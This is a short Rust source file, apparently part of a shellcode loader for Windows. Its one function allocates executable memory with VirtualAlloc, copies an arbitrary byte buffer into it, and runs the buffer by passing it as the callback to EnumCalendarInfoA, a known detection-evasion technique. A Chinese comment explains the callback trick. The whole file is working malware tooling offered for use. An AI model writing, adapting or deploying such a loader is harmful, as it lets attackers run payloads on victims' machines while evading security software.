use std::mem::transmute;

use windows::core::Result;
use windows::Win32::Globalization::{
    EnumCalendarInfoA, CAL_SMONTHNAME1,
    ENUM_ALL_CALENDARS
};
use windows::Win32::System::Memory::{
    VirtualAlloc, MEM_COMMIT, MEM_RESERVE, 
    PAGE_EXECUTE_READWRITE,
};

pub(crate) fn callback(buf:&[u8])->Result<()>{
    unsafe{
        //VirtualAlloc
        let addr=VirtualAlloc(None, buf.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        //Move
        std::ptr::copy_nonoverlapping(buf.as_ptr().cast(), addr, buf.len());

        //调用Windows的api：EnumCalendarInfoA它的第一个参数是一个回调函数，可以设置为我们自己的函数执行
        EnumCalendarInfoA(transmute(addr), 0x0c00, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1,)?;
    }
    return Ok(());
}